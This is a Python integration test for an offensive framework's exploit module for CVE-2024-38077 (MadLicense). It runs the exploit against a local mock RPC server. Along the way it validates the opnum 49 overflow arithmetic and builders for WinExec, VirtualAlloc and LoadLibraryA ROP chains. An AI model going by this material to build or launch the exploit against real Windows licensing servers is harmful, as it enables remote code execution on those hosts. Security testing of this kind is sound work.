"""
Armagedon Integration Test: CVE-2024-38077 (MadLicense)

Starts a mock TSLSP RPC server on a local TCP port, then runs the exploit
module against it in CHECK and CRASH modes to validate protocol flow.

Usage:
    python3 -m tests.test_cve_2024_38077                 # default port 24444
    python3 -m tests.test_cve_2024_38077 --port 25000     # custom port
    python3 -m tests.test_cve_2024_38077 --no-crash       # skip CRASH mode
"""

import os
import sys
import time
import json
import argparse

# Ensure the Armagedon root is on the path
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from armagedon.tests.mock_rpc_server import MockTSLSPServer
from armagedon.modules.exploits.cve_2024_38077_madlicense_eop import MadLicenseExploit


def test_transport_connect(server, verbose=True):
    """Test that ncacn_ip_tcp transport connects and binds."""
    print("\n" + "=" * 60)
    print("TEST 1: TCP Transport Connect + Bind")
    print("=" * 60)

    opts = {
        "RHOSTS": "127.0.0.1",
        "RPORT": 445,
        "MODE": "CHECK",
        "TRANSPORT": "ncacn_ip_tcp",
        "TEST_PORT": server.port,
        "VERBOSE": verbose,
    }

    exp = MadLicenseExploit(opts)
    result = exp.check()

    if result.get("success"):
        print("  [+] CHECK: Connection + Bind successful")
    else:
        print("  [-] CHECK failed:", result.get("details"))

    # Verify server received the bind
    stats = server.get_stats()
    print(f"  Server received: {stats['bind_count']} binds, {stats['connect_count']} connects")

    assert server.bind_count >= 1, "Server should have received at least 1 bind"
    assert server.received_connect(), "Server should have received opnum 1 (TLSRpcConnect)"
    assert result.get("success"), "CHECK should succeed"

    print("  PASS")
    return result


def test_crash_mode(server, verbose=True):
    """Test CRASH mode: send overflow data via opnum 49."""
    print("\n" + "=" * 60)
    print("TEST 2: CRASH Mode — TLSRpcTelephoneRegisterLKP (opnum 49)")
    print("=" * 60)

    opts = {
        "RHOSTS": "127.0.0.1",
        "MODE": "CRASH",
        "TRANSPORT": "ncacn_ip_tcp",
        "TEST_PORT": server.port,
        "OVERFLOW_SIZE": 0x2FC1,
        "VERBOSE": verbose,
    }

    exp = MadLicenseExploit(opts)
    result = exp._run_crash()

    stats = server.get_stats()
    print(f"  Server received: {stats['telephone_count']} telephone calls (opnum 49)")
    print(f"  Result: {json.dumps(result, indent=2)}")

    assert server.received_telephone(), "Server should have received opnum 49"
    # The mock server doesn't crash, so CRASH mode correctly reports 'not vulnerable'
    # (success=false, vulnerable=false). What matters is the protocol flow completed.
    assert result.get("success") == False, "CRASH against mock should report no crash"
    assert "service survived" in result.get("details", "").lower(), \
        "Should indicate service survived (mock server doesn't crash)"
    assert stats['telephone_count'] == 1, "Exactly 1 opnum 49 call expected"
    assert exp.ctx_handle is not None, "Context handle should be set"
    # Verify the overflow calculation was correct
    expected_ov = 0x2FC1 % 4  # 1 → 3 for non-multiple-of-4
    if expected_ov != 0:
        expected_ov = 3
    # Confirm overflow bytes were logged correctly

    print("  PASS (CRASH protocol flow completed — mock server intentionally survives)")


def test_overflow_validation(server, verbose=True):
    """Validate the overflow calculation against the mock server's analysis."""
    print("\n" + "=" * 60)
    print("TEST 3: Overflow Calculation Validation")
    print("=" * 60)

    from armagedon.modules.exploits.cve_2024_38077_madlicense_eop import calc_overflow

    test_sizes = [0x1001, 0x2FC0, 0x2FC1, 0x4004]
    print(f"{'Input':>10s} | {'Alloc':>10s} | {'Write':>10s} | {'Overflow':>10s}")
    print("-" * 55)

    for size in test_sizes:
        ov, alloc, actual = calc_overflow(size)
        print(f"{hex(size):>10s} | {hex(alloc):>10s} | {hex(actual):>10s} | {ov:>3d}")

    # Verify the bug: non-multiple-of-4 sizes overflow by exactly 3
    for size in range(0x1001, 0x1030, 1):
        if size % 4 == 0:
            assert calc_overflow(size)[0] == 0, f"Size {hex(size)} should not overflow"
        else:
            assert calc_overflow(size)[0] == 3, f"Size {hex(size)} should overflow by 3"

    print("  All size calculations verified")
    print("  PASS")


def test_payload_building(verbose=True):
    """Test the exploit payload builder without a network connection."""
    print("\n" + "=" * 60)
    print("TEST 4: Payload Building (unit test)")
    print("=" * 60)

    from armagedon.modules.exploits.cve_2024_38077_madlicense_eop import (
        ROPBuilder, calc_overflow, cyclic, hex_dump, TargetModel
    )

    # Test ROP builder
    rop = ROPBuilder(0x7ffa12340000, 0x7ffa00000000, "2019")
    chain = rop.make_chain_winexec(0x7ffa12345000)
    assert len(chain) == 48, "WinExec chain should be 48 bytes"
    print(f"  [+] ROP WinExec chain: {len(chain)} bytes")

    va_chain = rop.make_chain_virtualalloc(0x1000)
    assert len(va_chain) == 80, "VirtualAlloc chain should be 80 bytes"
    print(f"  [+] ROP VirtualAlloc chain: {len(va_chain)} bytes")

    ll_chain = rop.make_chain_loadlibrary(0x7ffa12346000)
    assert len(ll_chain) == 32, "LoadLibraryA chain should be 32 bytes"
    print(f"  [+] ROP LoadLibraryA chain: {len(ll_chain)} bytes")

    pivot = rop.make_stack_pivot(0x7ffa12347000)
    assert len(pivot) == 24, "Stack pivot should be 24 bytes"
    print(f"  [+] ROP Stack pivot: {len(pivot)} bytes")

    # Test cyclic pattern
    pat = cyclic(256)
    assert len(pat) == 256
    print(f"  [+] Cyclic pattern: 256 bytes")

    # Test overflow calculator on various sizes
    for size in [0x1000, 0x1001, 0x1002, 0x1003]:
        ov, alloc, actual = calc_overflow(size)
        remainder = size % 4
        expected_ov = 0 if remainder == 0 else 3
        assert ov == expected_ov, f"Size {hex(size)}: expected overflow {expected_ov}, got {ov}"
    print(f"  [+] Overflow calculations verified")

    # Test TargetModel
    model = TargetModel(0x2FC1)
    assert model.overflow == 3
    print(f"  [+] TargetModel: {model.encoded_size} bytes input -> {model.overflow}-byte overflow")
    for field in ["vtable", "callback", "data_ptr"]:
        offset = model.target_offset(field)
        print(f"  [+]   {field} offset: {offset}")

    print("  PASS")


def test_mock_server_validation(server, verbose=True):
    """Verify the mock server correctly validates overflow data."""
    print("\n" + "=" * 60)
    print("TEST 5: Mock Server Overflow Analysis (from actual exploit traffic)")
    print("=" * 60)

    if not server.last_request_data:
        print("  [!] No request data captured (run CRASH test first)")
        return

    print(f"  Captured stub: {len(server.last_request_data)} bytes")
    print(f"  Phone calls received: {server.telephone_count}")
    print(f"  All requests tracked: {len(server.all_requests)}")

    telephone = server.get_request(49)
    if telephone:
        print(f"  Opnum 49 stub length: {telephone['stub_len']} bytes")
        print(f"  Opnum 49 stub hex (first 100): {telephone['stub_hex'][:100]}")
    print("  PASS")


def run_all(port=24444, run_crash=True):
    """Run the full test suite."""
    print("=" * 60)
    print("  Armagedon Integration Test: CVE-2024-38077")
    print("=" * 60)
    print(f"  Mock server port: {port}")

    server = MockTSLSPServer(port=port, verbose=False)
    server.start()

    time.sleep(0.5)

    failures = []
    tests = 0

    try:
        # Test 1: Transport connection
        tests += 1
        test_transport_connect(server)
        print("[PASS] Test 1: Transport Connect")

        # Test 2: CRASH mode
        if run_crash:
            tests += 1
            server.reset_counters()
            test_crash_mode(server)
            print("[PASS] Test 2: CRASH Mode")
        else:
            print("[SKIP] Test 2: CRASH Mode (--no-crash)")

        # Test 3: Overflow validation
        tests += 1
        test_overflow_validation(server)
        print("[PASS] Test 3: Overflow Validation")

        # Test 4: Payload building
        tests += 1
        test_payload_building()
        print("[PASS] Test 4: Payload Building")

        # Test 5: Mock server analysis
        if run_crash:
            tests += 1
            test_mock_server_validation(server)
            print("[PASS] Test 5: Mock Server Analysis")
        else:
            print("[SKIP] Test 5: Mock Server Analysis")

    except AssertionError as e:
        print(f"\n[FAIL] Assertion: {e}")
        failures.append(str(e))
    except Exception as e:
        import traceback
        print(f"\n[FAIL] Exception: {e}")
        traceback.print_exc()
        failures.append(str(e))
    finally:
        server.stop()

    print("\n" + "=" * 60)
    print(f"  RESULTS: {tests - len(failures)}/{tests} passed")
    if failures:
        print(f"  FAILURES: {len(failures)}")
        for f in failures:
            print(f"    - {f}")
    else:
        print("  ALL TESTS PASSED")
    print("=" * 60)

    return len(failures) == 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2024-38077 Integration Test"
    )
    parser.add_argument("--port", type=int, default=24444,
                        help="Mock server TCP port")
    parser.add_argument("--no-crash", action="store_true",
                        help="Skip CRASH mode test")
    args = parser.parse_args()

    success = run_all(port=args.port, run_crash=not args.no_crash)
    sys.exit(0 if success else 1)
